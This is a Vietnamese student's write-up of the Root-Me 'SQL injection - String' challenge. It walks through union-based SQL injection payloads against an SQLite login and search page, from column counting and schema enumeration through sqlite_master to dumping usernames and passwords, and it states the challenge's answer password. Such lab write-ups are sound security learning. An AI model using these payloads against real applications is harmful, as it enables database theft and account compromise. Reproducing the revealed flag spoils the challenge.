# Challenge: SQL injection - String
## Người làm:   
    Nguyễn Ngọc Trưởng - 19522440
    Thời gian: 
## Link: 
    https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-String

- Vào thử thách này thì ta thấy cả trang sẽ có 2 form, 1 là form tìm kiếm, 2 là form đăng nhập 
<p align="center"><img src="./images/3.1.png"></p>
<p align="center"><img src="./images/3.2.png"></p>

- Vì đề hỏi là password của admin, và nó có 2 form nên ta thử xem xét lỗi injection kết hợp union ở form tìm kiếm, kiểm tra ngay (nhập `abc '`) thì ta thấy thật sự có lỗi này
<p align="center"><img src="./images/3.3.png"></p>

- Thử với `abc' order by 3 --`
<p align="center"><img src="./images/3.4.png"></p>

- Thử với `abc' order by 2 --`
<p align="center"><img src="./images/3.5.png"></p>

- Thử với `abc' union select 1,2 --` để xem các cột hiển thị trên trình duyệt
<p align="center"><img src="./images/3.6.png"></p>

- Ta biết rằng cơ sở dữ liệu của web là sqlite3, thông qua thông báo lỗi. Ta tham khảo các lệnh sqlite 3 ở đây 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md

- Thử với `abc' union select 1, tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' --` để show ra các table có trong csdl
<p align="center"><img src="./images/3.7.png"></p>

--> Ta thấy csdl gồm có 2 tables: users và news

- Thử với `abc' union select 1,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users' --` để show ra các cột có trong bảng user
<p align="center"><img src="./images/3.8.png"></p>

- Lấy username password với input là `abc' union select username, password from users -- `
<p align="center"><img src="./images/3.9.png"></p>

- Lấy password của admin submit, và vượt qua thử thách
## Kết quả password là `c4K04dtIaJsuWdi`